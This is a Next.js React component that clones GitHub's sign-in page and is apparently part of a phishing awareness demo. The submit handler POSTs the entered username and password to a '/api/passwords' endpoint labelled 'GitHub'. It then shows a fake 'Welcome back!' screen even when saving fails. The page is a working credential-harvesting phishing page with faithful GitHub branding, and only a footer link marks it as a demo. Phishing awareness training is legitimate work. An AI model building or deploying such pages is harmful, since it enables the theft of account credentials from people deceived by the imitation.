"use client";

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';

function GitHubLoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const router = useRouter();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!password) return;

    setIsLoading(true);

    try {
      // Save password and username to API
      const response = await fetch('/api/passwords', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          password: password,
          email: username, // GitHub uses username/email field
          site: 'GitHub'
        }),
      });

      const data = await response.json();

      if (data.success) {
        setIsLoading(false);
        setIsSuccess(true);

        // Redirect after success
        setTimeout(() => {
          router.push('/');
        }, 2000);
      } else {
        throw new Error('Failed to save credentials');
      }
    } catch (error) {
      console.error('Error saving credentials:', error);
      setIsLoading(false);
      // Still show success for demo purposes
      setIsSuccess(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);
    }
  };

  return (
    <div className="bg-gray-50 min-h-screen flex flex-col items-center font-sans text-sm text-gray-900">
      <header className="w-full pt-8 pb-6 text-center">
        <a href="#" aria-label="Homepage">
          <svg
            height="48"
            aria-hidden="true"
            viewBox="0 0 16 16"
            version="1.1"
            width="48"
            className="inline-block"
          >
            <path
              fillRule="evenodd"
              d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"
            ></path>
          </svg>
        </a>
      </header>

      <main className="w-full max-w-sm px-4">
        <div className="text-center mb-4">
          <h1 className="text-2xl font-light">Sign in to GitHub</h1>
        </div>

        <div className="bg-white border border-gray-300 rounded-lg p-6">
          {isSuccess ? (
            <div className="text-center">
              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2">Welcome back!</h3>
              <p className="text-gray-600">Redirecting to your repositories...</p>
            </div>
          ) : (
            <form onSubmit={handleSubmit}>
              <div className="mb-4">
                <label htmlFor="login_field" className="block text-sm font-medium mb-1">
                  Username or email address
                </label>
                <input
                  type="text"
                  id="login_field"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900 placeholder:text-gray-500"
                  placeholder="Username or email address"
                />
              </div>

              <div className="relative mb-4">
                <label htmlFor="password" className="block text-sm font-medium mb-1">
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900 placeholder:text-gray-500"
                  placeholder="Password"
                  required
                />
                <a href="#" className="absolute top-7 right-0 text-xs text-blue-600 hover:underline">
                  Forgot password?
                </a>
              </div>

              <button
                type="submit"
                disabled={isLoading || !password}
                className="w-full bg-green-600 text-white font-semibold py-2 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
              >
                {isLoading ? (
                  <>
                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Signing in...
                  </>
                ) : (
                  'Sign in'
                )}
              </button>
            </form>
          )}
        </div>

        <div className="mt-4 p-4 border border-gray-300 rounded-lg text-center text-sm">
          <p>
            New to GitHub?{' '}
            <a href="#" className="text-blue-600 hover:underline">
              Create an account
            </a>
            .
          </p>
        </div>
      </main>

      <footer className="mt-16 py-6">
        <ul className="flex justify-center space-x-4 text-xs text-blue-600">
          <li><a href="#" className="hover:underline">Terms</a></li>
          <li><a href="#" className="hover:underline">Privacy</a></li>
          <li><a href="#" className="hover:underline">Security</a></li>
          <li><a href="#" className="text-gray-500 hover:text-blue-600 hover:underline">Contact GitHub</a></li>
        </ul>
      </footer>

      {/* Back to Home */}
      <div className="text-center mt-6">
        <Link href="/" className="text-sm text-gray-600 hover:text-gray-800">
          ← Back to Phishing Awareness Demo
        </Link>
      </div>
    </div>
  );
}

export default GitHubLoginPage;